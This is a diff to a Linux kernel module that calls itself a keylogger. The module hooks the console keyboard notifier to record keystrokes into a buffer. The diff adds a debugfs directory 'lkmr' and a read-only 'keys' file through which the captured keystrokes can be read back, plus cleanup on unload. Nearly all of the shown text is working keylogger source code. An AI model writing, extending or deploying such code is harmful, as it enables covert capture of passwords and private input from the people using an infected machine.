@@ -5,7 +5,6 @@
 #include <linux/keyboard.h>
 #include <linux/debugfs.h>
 #include <linux/input.h>
-
 #include <linux/fs.h>
 #include <asm/segment.h>
 #include <asm/uaccess.h>
@@ -17,6 +16,9 @@
 // *********************************************************************
 // function prototypes
 // *********************************************************************
+
+
+static ssize_t keys_read(struct file *filp,	char *buffer,	size_t len,	loff_t *offset);
 static int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param);
 
 // *********************************************************************
@@ -67,9 +69,25 @@ static const char *us_keymap[][2] = {
 static size_t buf_pos;
 static char __user keys_buf[BUF_LEN];
 
+static struct dentry *file;
+static struct dentry *subdir;
+
+const struct file_operations keys_fops = {
+	.owner = THIS_MODULE,
+	.read = keys_read,
+};
+
 // *********************************************************************
 // functions definitions
 // *********************************************************************
+
+/**
+ * keys_read - read function for @file_operations structure
+ */
+static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset)
+{
+	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
+}
 
 static struct notifier_block keysniffer_blk = {
 	.notifier_call = keysniffer_cb,
@@ -134,6 +152,28 @@ int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_para
 ///dev/input/event2
 static int run_keylogger(void)
 {
+	subdir = debugfs_create_dir("lkmr", NULL);
+	if (IS_ERR(subdir))
+		return PTR_ERR(subdir);
+	if (!subdir)
+	{
+		printk(KERN_ERR "Keylogger: Unable to create folder");
+		return -ENOENT;
+	}
+
+	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
+	if (!file) {
+		printk(KERN_ERR "Keylogger: Unable to create file");
+		debugfs_remove_recursive(subdir);
+		return -ENOENT;
+	}
+
+	/*
+	 * Add to the list of console keyboard event
+	 * notifiers so the callback keysniffer_cb is
+	 * called when an event occurs.
+	 */
+
 	register_keyboard_notifier(&keysniffer_blk);
   printk("Keylogger: working\n");
 	return 0;
@@ -142,5 +182,6 @@ static int run_keylogger(void)
 static int exit_keylogger(void)
 {
 	unregister_keyboard_notifier(&keysniffer_blk);
+	debugfs_remove_recursive(subdir);
   return 0;
 }
